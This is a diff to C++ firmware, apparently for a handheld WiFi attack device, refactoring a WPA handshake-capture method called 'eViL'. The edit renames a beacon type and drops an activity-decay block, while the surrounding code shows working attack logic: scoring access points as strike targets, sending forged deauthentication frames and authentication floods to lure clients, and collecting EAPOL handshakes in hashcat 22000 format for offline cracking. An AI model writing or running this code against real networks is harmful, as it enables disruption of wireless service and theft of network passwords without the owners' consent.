@@ -82,18 +82,11 @@ static void bumpActivity(const uint8_t* bssid) {
     if (s_act[idx].recent < 0xFFFF) s_act[idx].recent++;
 }
 
-static void decayActivity(uint32_t now, const Ctx& ctx) {
+static void decayActivity(uint32_t now) {
     if (now - s_lastActDecayMs < 1000) return;
     s_lastActDecayMs = now;
     for (uint8_t i = 0; i < ACT_SLOTS; i++) {
         if (s_act[i].used) s_act[i].recent = (uint16_t)(s_act[i].recent >> 1);
-    }
-    if (ctx.dataAct && ctx.beacons) {
-        for (uint8_t i = 0; i < ctx.beaconCount; i++) {
-            if (ctx.beacons[i].dataRecent) {
-                ctx.beacons[i].dataRecent = (uint16_t)(ctx.beacons[i].dataRecent >> 1);
-            }
-        }
     }
 }
 
@@ -136,7 +129,7 @@ static void expireStale(uint32_t now) {
 // ----- shared candidate filter -------------------------------------------
 // Same skip rules every method applies: right channel, not ours, not pinned
 // away, not session-skipped, strong enough.
-static bool usable(const Ctx& ctx, const BeaconSlot& b) {
+static bool usable(const Ctx& ctx, const BeaconView& b) {
     if (b.channel != ctx.channel) return false;
     if (ctx.isOwnAp(b.bssid)) return false;
     if (ctx.skipPin(b.bssid)) return false;
@@ -156,7 +149,7 @@ static uint8_t maskBits(uint8_t m) {
 // likely is a strike to land". Proximity + clients + activity get it started;
 // the EAPOL-mask terms are what make it smart - a target that already gave us
 // half the four-way is worth far more than a silent stranger.
-static int32_t computeEvilScore(const BeaconSlot& b, uint8_t hsDepth, bool dataAct) {
+static int32_t computeEvilScore(const BeaconView& b, uint8_t hsDepth, bool dataAct) {
     int32_t s = 0;
 
     int16_t r = b.rssi;
@@ -220,7 +213,7 @@ static uint8_t roundsFor(const Ctx& ctx, const EvilEntry* e) {
 }
 
 // ----- strike / attract ---------------------------------------------------
-static void strike(const Ctx& ctx, BeaconSlot& b, uint32_t now) {
+static void strike(const Ctx& ctx, BeaconView& b, uint32_t now) {
     EvilEntry* e = entryFor(b.bssid);
     uint8_t maskBefore = Hc22000::handshakeMask(b.bssid);
 
@@ -268,7 +261,7 @@ static void strike(const Ctx& ctx, BeaconSlot& b, uint32_t now) {
 // Lure stations to an AP with nobody (visibly) on it, so a handshake can even
 // happen. Returns false when AUTH FLOOD is off (caller then falls back to a
 // plain broadcast strike if that is allowed).
-static bool attract(const Ctx& ctx, BeaconSlot& b, uint32_t now) {
+static bool attract(const Ctx& ctx, BeaconView& b, uint32_t now) {
     if (!ctx.authFlood) return false;
     WSLBypasser::sendAuthFlood(b.bssid, 8);
     *ctx.framesDeauth += 8;
@@ -282,7 +275,7 @@ static bool attract(const Ctx& ctx, BeaconSlot& b, uint32_t now) {
 // ----- the hunt -----------------------------------------------------------
 void evil(const Ctx& ctx) {
     uint32_t now = millis();
-    decayActivity(now, ctx);
+    decayActivity(now);
     expireStale(now);
 
     uint8_t n = ctx.beaconCount;
@@ -290,7 +283,7 @@ void evil(const Ctx& ctx) {
     // Legacy beacon-activity bump (DATA ACT off). Mirrors FOCUS.
     if (!ctx.dataAct && ctx.beacons) {
         for (uint8_t i = 0; i < n; i++) {
-            const BeaconSlot& b = ctx.beacons[i];
+            const BeaconView& b = ctx.beacons[i];
             if (b.channel != ctx.channel) continue;
             if (b.rssi < ctx.minRssi) continue;
             bumpActivity(b.bssid);
@@ -313,7 +306,7 @@ void evil(const Ctx& ctx) {
     // ---- lock-on-BSSID: STRICT LK pins eViL to the target ---------------
     if (ctx.strictLock && ctx.lockedBssidActive && ctx.lockedBssid[0] != 0) {
         for (uint8_t i = 0; i < n; i++) {
-            BeaconSlot& b = ctx.beacons[i];
+            BeaconView& b = ctx.beacons[i];
             if (memcmp(b.bssid, ctx.lockedBssid, 6) != 0) continue;
             if (!usable(ctx, b)) break;
             if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) break; // done
@@ -338,7 +331,7 @@ void evil(const Ctx& ctx) {
     int32_t bestScore = INT32_MIN;
     int8_t  bestIdx = -1;
     for (uint8_t i = 0; i < n; i++) {
-        BeaconSlot& b = ctx.beacons[i];
+        BeaconView& b = ctx.beacons[i];
         if (!usable(ctx, b)) continue;
         EvilEntry* e = entryFor(b.bssid);
         e->lastSeenMs = now;
@@ -356,7 +349,7 @@ void evil(const Ctx& ctx) {
         // attract stations somewhere, then let the CSA pack knob run.
         if (ctx.authFlood) {
             for (uint8_t i = 0; i < n; i++) {
-                BeaconSlot& b = ctx.beacons[i];
+                BeaconView& b = ctx.beacons[i];
                 if (!usable(ctx, b)) continue;
                 if (b.pmfCapable) continue;
                 if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
@@ -368,7 +361,7 @@ void evil(const Ctx& ctx) {
         return;
     }
 
-    BeaconSlot& target = ctx.beacons[bestIdx];
+    BeaconView& target = ctx.beacons[bestIdx];
 
     if (target.pmfCapable) {
         // Forged deauth can't reach a PMF AP: mark the visit and let the CSA
@@ -411,7 +404,7 @@ void evilProbe(const Ctx& ctx) {
     int32_t bestScore = INT32_MIN;
     for (uint8_t k = 0; k < n; k++) {
         s_probeIdx = (uint8_t)((s_probeIdx + 1) % n);
-        const BeaconSlot& b = ctx.beacons[s_probeIdx];
+        const BeaconView& b = ctx.beacons[s_probeIdx];
         if (b.channel != ctx.channel) continue;
         if (ctx.isOwnAp(b.bssid)) continue;
         if (ctx.skipPin(b.bssid)) continue;
@@ -425,7 +418,7 @@ void evilProbe(const Ctx& ctx) {
     }
     if (best < 0) return;
 
-    const BeaconSlot& b = ctx.beacons[best];
+    const BeaconView& b = ctx.beacons[best];
     WSLBypasser::sendAuthentication(b.bssid);
     WSLBypasser::sendAssociationRequest(b.bssid, b.ssid);
     s_lastProbeMs = now;
@@ -449,4 +442,3 @@ CAP_METHOD_REGISTER("eViL", evil, evilProbe, resetEvilState, evilKnobs)
 
 } // namespace Methods
 } // namespace Cap
-
